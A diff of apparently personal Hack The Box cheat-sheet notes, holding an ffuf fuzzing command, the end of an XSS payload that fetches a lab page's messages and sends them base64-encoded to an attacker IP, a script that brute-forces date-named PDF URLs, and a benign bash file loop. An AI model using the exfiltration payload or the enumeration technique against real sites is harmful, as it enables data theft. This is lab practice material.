@@ -6,7 +6,7 @@
 
 `ffuf -request request.txt -request-proto http -w ../../scripts/num.txt:HFUZZ -w ../../scripts/charlist.txt:WFUZZ -fw 73`
 
-<div align="left"><figure><img src="../../.gitbook/assets/image (6).png" alt="" width="506"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../../.gitbook/assets/image (6) (1).png" alt="" width="506"><figcaption></figcaption></figure></div>
 
 ```bash
 cat output | grep '*' > newoutput
@@ -79,4 +79,52 @@ fetch('http://alert.htb/messages.php')
     fetch("http://10.10.14.6/exfil?body=" + btoa(body));
 })
 </script>
+```
+
+## Web
+
+### Web Requests and using date in file name
+
+```python
+import datetime
+import requests
+​
+t = datetime.datetime(2020, 1, 1)
+end = datetime.datetime(2021, 7, 4)
+​
+while True:
+    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")
+    resp = requests.get(url)
+    if resp.status_code == 200:
+        with open(t.strftime('%Y-%m-%d-upload.pdf'), 'wb') as f:
+            f.write(resp.content)
+    t = t + datetime.timedelta(days=1)
+    if t > end:
+        break
+​
+```
+
+## Bash
+
+### Processing all files in a directory
+
+```bash
+#!/bin/bash
+
+TARGET_DIR="/home/jtripz/htb/rooms/intelligence/pdfs" # Replace with the actual path
+
+# Check if the directory exists and is a directory
+if [ ! -d "$TARGET_DIR" ]; then
+  echo "Error: '$TARGET_DIR' is not a valid directory."
+  exit 1
+fi
+
+# Loop through each item in the directory
+for entry in "$TARGET_DIR"/*; do
+  # Check if the current item is a regular file
+  if [ -f "$entry" ]; then
+    echo "Processing file: $entry"
+    # Add your desired operations on the file here
+  fi
+done
 ```
